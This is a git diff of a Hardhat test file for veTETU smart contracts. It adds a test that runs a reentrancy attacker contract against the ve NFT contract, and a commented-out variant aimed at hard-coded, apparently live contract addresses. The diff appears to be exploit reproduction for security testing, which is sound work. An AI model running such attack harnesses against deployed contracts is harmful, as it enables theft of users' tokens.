@@ -53,6 +53,14 @@ describe("veTETU tests", function () {
     ve = await DeployerUtils.deployVeTetu(owner, tetu.address, controller.address, parseUnits('100'));
     voter = await DeployerUtils.deployMockVoter(owner, ve.address);
     pawnshop = await DeployerUtils.deployContract(owner, 'MockPawnshop') as MockPawnshop;
+    console.log("pawnshop", pawnshop.address);
+    console.log("voter", voter.address);
+    console.log("ve", ve.address);
+    console.log("underlying2", underlying2.address);
+    console.log("owner", owner.address);
+    console.log("owner2", owner2.address);
+    console.log("owner3", owner3.address);
+    console.log("attacker", attacker.address);
 
     const veDist = await DeployerUtils.deployVeDistributor(
       owner,
@@ -965,14 +973,44 @@ describe("veTETU tests", function () {
 
 
 
-  it("should be vulnerable to reentrancy", async () => {
+  it("should be vulnerable to reentrancy in i32309", async () => {
     console.log("Attacker NFT balance before the hack: ", (await ve.balanceOf(erc721ReentrancyAttacker.address)).toString());
+    const tokenId = await ve.tokenId();
+    console.log("tokenId", tokenId);
+
+    const tokenOwner = await ve.ownerOf(tokenId);
+    console.log("tokenOwner", tokenOwner);
+
+    // assume, that owner2 allows to transfer 1 token to attacker
+    await ve.announceAction(2);
+    await TimeUtils.advanceBlocksOnTs(60 * 60 * 18);
+    await ve.whitelistTransferFor(tokenOwner);
+    await ve.connect(owner2).approve(erc721ReentrancyAttacker.address, tokenId);
 
     console.log("Attacker is attacking...");
-    await erc721ReentrancyAttacker.connect(attacker).attack(pawnshop.address);
+    await erc721ReentrancyAttacker.connect(attacker).attack(tokenId, tokenOwner);
 
     console.log("Attacker NFT balance after the hack: ", (await ve.balanceOf(erc721ReentrancyAttacker.address)).toString());
   });
+
+  // it("should be vulnerable to reentrancy - real", async () => {
+  //   const VE = "0x6FB29DD17fa6E27BD112Bc3A2D0b8dae597AeDA4";
+  //   const PAWNSHOP = "0x0c9FA52D7Ed12a6316d3738c80931eCbC6C49907";
+  //   const localAttacker = attacker;
+  //
+  //   const ERC721ReentrancyAttacker = await ethers.getContractFactory("ERC721ReentrancyAttacker");
+  //   erc721ReentrancyAttacker = await ERC721ReentrancyAttacker.deploy(VE);
+  //   await erc721ReentrancyAttacker.deployed();
+  //
+  //   const veLocal = VeTetu__factory.connect(VE, localAttacker);
+  //
+  //   console.log("Attacker NFT balance before the hack: ", (await veLocal.balanceOf(erc721ReentrancyAttacker.address)).toString());
+  //
+  //   console.log("Attacker is attacking...");
+  //   await erc721ReentrancyAttacker.connect(localAttacker).attack(pawnshop.address);
+  //
+  //   console.log("Attacker NFT balance after the hack: ", (await veLocal.balanceOf(erc721ReentrancyAttacker.address)).toString());
+  // });
 });
 
 async function maxLockTime(ve: VeTetu) {
